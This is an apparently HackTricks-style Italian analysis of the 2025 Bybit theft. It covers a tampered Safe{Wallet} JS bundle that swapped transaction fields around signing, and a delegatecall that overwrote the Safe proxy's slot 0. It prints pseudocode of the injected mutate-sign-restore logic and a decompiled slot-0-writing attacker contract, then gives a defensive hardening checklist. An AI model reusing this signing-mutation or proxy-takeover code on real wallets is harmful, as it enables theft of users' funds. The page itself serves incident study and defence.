# Compromission del workflow di signing Web3 e takeover del proxy Safe tramite delegatecall

{{#include ../../banners/hacktricks-training.md}}

## Panoramica

Una chain di furto da cold wallet ha combinato un **supply-chain compromise della web UI di Safe{Wallet}** con una **primitiva on-chain di delegatecall che sovrascriveva il puntatore all'implementazione di un proxy (slot 0)**. I punti chiave sono:

- Se una dApp può iniettare codice nel signing path, può fare in modo che un signer produca una **firma EIP-712 valida su campi scelti dall'attacker**, ripristinando al contempo i dati originali della UI affinché gli altri signer rimangano all'oscuro.
- I proxy Safe archiviano `masterCopy` (implementazione) nello **storage slot 0**. Una delegatecall verso un contratto che scrive nello slot 0 effettua di fatto un “upgrade” del Safe alla logica dell'attacker, ottenendo il controllo completo del wallet.

## Off-chain: mutazione mirata del signing in Safe{Wallet}

Un bundle di Safe manomesso (`_app-*.js`) attaccava selettivamente specifici indirizzi Safe e signer. La logica iniettata veniva eseguita subito prima della chiamata di signing:<sup>[[1]](#references)[[3]](#references)</sup>
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Proprietà dell'attacco
- **Context-gated**: le allowlist hard-coded per le Safe/victim signer hanno impedito il noise e ridotto il rilevamento.<sup>[[1]](#references)[[3]](#references)</sup>
- **Last-moment mutation**: i campi (`to`, `data`, `operation`, gas) venivano sovrascritti immediatamente prima di `signTransaction`, quindi ripristinati; perciò i payload delle proposal nella UI apparivano benigni, mentre le signature corrispondevano al payload dell'attacker.
- **EIP-712 opacity**: i wallet mostravano dati strutturati, ma non decodificavano il calldata annidato né evidenziavano `operation = delegatecall`, rendendo il messaggio mutato di fatto blind-signed.

### Rilevanza della validazione del Gateway
Le proposal delle Safe vengono inviate al **Safe Client Gateway**. Prima dell'introduzione dei controlli hardened, il gateway poteva accettare una proposal in cui `safeTxHash`/signature corrispondevano a campi diversi da quelli del JSON body, se la UI li riscriveva dopo la firma. Dopo l'incident, il gateway ora rifiuta le proposal il cui hash/signature non corrispondono alla transaction inviata. Una verifica server-side analoga dell'hash dovrebbe essere applicata a qualsiasi API di signing-orchestration.

### Punti salienti dell'incident Bybit/Safe del 2025
- Il drain del cold wallet di Bybit del 21 febbraio 2025 (~401k ETH) ha riutilizzato lo stesso pattern: un bundle S3 compromesso della Safe si attivava solo per i signer di Bybit e sostituiva `operation=0` con `1`, impostando `to` su un attacker contract pre-deployed che scrive nello slot 0.<sup>[[1]](#references)[[3]](#references)</sup>
- `_app-52c9031bfa03da47.js`, memorizzato nella cache di Wayback, mostra una logica basata sulla Safe di Bybit (`0x1db9…cf4`) e sugli indirizzi dei signer, quindi ripristinata immediatamente a un bundle pulito due minuti dopo l'esecuzione, riproducendo il trucco “mutate → sign → restore”.<sup>[[1]](#references)[[2]](#references)</sup>
- Il malicious contract (ad esempio, `0x9622…c7242`) conteneva semplici funzioni `sweepETH/sweepERC20` e una `transfer(address,uint256)` che scrive nello implementation slot. L'esecuzione di `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` ha modificato l'implementazione della proxy e concesso il controllo completo.<sup>[[1]](#references)[[3]](#references)</sup>

## On-chain: Delegatecall proxy takeover tramite slot collision

Le proxy Safe mantengono `masterCopy` nello **storage slot 0** e delegano tutta la logica a esso. Poiché Safe supporta **`operation = 1` (delegatecall)**, qualsiasi transaction firmata può puntare a un contract arbitrario ed eseguirne il codice nel contesto di storage della proxy.<sup>[[3]](#references)</sup>

Un attacker contract imitava una `transfer(address,uint256)` ERC-20, ma scriveva invece `_to` nello slot 0:<sup>[[1]](#references)[[3]](#references)</sup>
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Percorso di esecuzione:<sup>[[1]](#references)[[3]](#references)</sup>
1. Le vittime firmano `execTransaction` con `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Safe masterCopy convalida le firme su questi parametri.
3. Il proxy esegue una delegatecall verso `attackerContract`; il corpo di `transfer` scrive nello slot 0.
4. Lo slot 0 (`masterCopy`) ora punta a una logica controllata dall'attaccante → **presa di controllo completa del wallet e drenaggio dei fondi**.

### Note su Guard e versioni (hardening post-incidente)
- I Safe >= v1.3.0 possono installare un **Guard** per bloccare `delegatecall` o applicare ACL su `to`/selector; Bybit utilizzava la v1.1.1, quindi non esisteva alcun hook di Guard. Per ottenere questo piano di controllo è necessario aggiornare i contratti (e aggiungere nuovamente i proprietari).

## Checklist di rilevamento e hardening

- **Integrità della UI**: fissare gli asset JS / SRI; monitorare le differenze tra i bundle; considerare la signing UI parte del trust boundary.
- **Validazione al momento della firma**: hardware wallet con **EIP-712 clear-signing**; visualizzare esplicitamente `operation` e decodificare la calldata annidata. Rifiutare la firma quando `operation = 1`, salvo autorizzazione prevista dalla policy.
- **Controlli degli hash lato server**: i gateway/servizi che inoltrano le proposte devono ricalcolare `safeTxHash` e verificare che le firme corrispondano ai campi inviati.
- **Policy/allowlist**: regole di preflight per `to`, selector, tipi di asset e divieto di delegatecall, salvo i flow verificati. Richiedere un servizio di policy interno prima di eseguire il broadcasting di transazioni completamente firmate.
- **Design dei contratti**: evitare di esporre delegatecall arbitrarie nei wallet multisig/treasury, salvo stretta necessità. Posizionare i puntatori agli upgrade lontano dallo slot 0 oppure proteggerli con una logica di upgrade esplicita e access control.
- **Monitoring**: generare alert sulle esecuzioni di delegatecall provenienti da wallet che contengono fondi treasury e sulle proposte che modificano `operation` rispetto ai consueti pattern di `call`.

## Riferimenti

- [1] [Analisi forense di AnChain.AI dell'exploit di Bybit Safe](https://www.anchain.ai/blog/bybit)
- [2] [Analisi di Zero Hour Technology della compromissione del bundle Safe](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [3] [Analisi tecnica approfondita dell'hack di Bybit (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [4] [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [5] [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
